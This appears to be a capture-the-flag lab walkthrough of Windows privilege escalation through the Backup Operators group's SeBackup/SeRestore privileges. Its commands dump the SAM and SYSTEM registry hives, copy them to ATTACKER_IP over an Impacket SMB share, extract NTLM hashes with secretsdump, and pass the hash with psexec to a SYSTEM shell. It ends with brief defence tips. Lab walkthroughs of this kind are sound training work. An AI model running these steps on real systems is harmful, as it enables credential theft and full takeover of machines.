
    Group Membership: Backup Operators

    Privileges: SeBackup & SeRestore (check with whoami /priv)

    Even though these privileges show as “Disabled,” they are enabled-on-demand when the process explicitly requests them.

🚀 Step-by-Step Attack
1. Login via RDP

Use Remote Desktop to access the machine with the THMBackup user.

Username: THMBackup  
Password: CopyMaster555

Once logged in, open Command Prompt as Administrator to use SeBackup/SeRestore.
2. Verify Privileges

whoami /priv

Check for:

SeBackupPrivilege
SeRestorePrivilege

3. Dump Registry Hives

Use the reg save command to extract the SAM and SYSTEM hives:

reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam     C:\Users\THMBackup\sam.hive

These files now contain the user password hashes in binary form.
4. Transfer Hives to Attacker Machine

On the Kali machine, start an SMB server using Impacket:

mkdir share
python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share

    Replace python3 with the correct version if needed (e.g., python3.11)

Then, from Windows victim machine:

copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

5. Extract Hashes with secretsdump

On the attacker machine:

python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL

Expected output:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::

6. Pass-the-Hash to Gain SYSTEM Shell

Use psexec.py with the NTLM hash:

python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.9.18

You should land in a SYSTEM-level shell:

whoami
> nt authority\system

🛡️ Defense Tips

    Monitor use of SeBackup/SeRestore privileges

    Restrict membership to Backup Operators

    Detect creation of SAM/SYSTEM hive files

    Disable or audit psexec-style remote code execution

📘 Related Tools

    impacket

    secretsdump.py

    psexec.py

    smbserver.py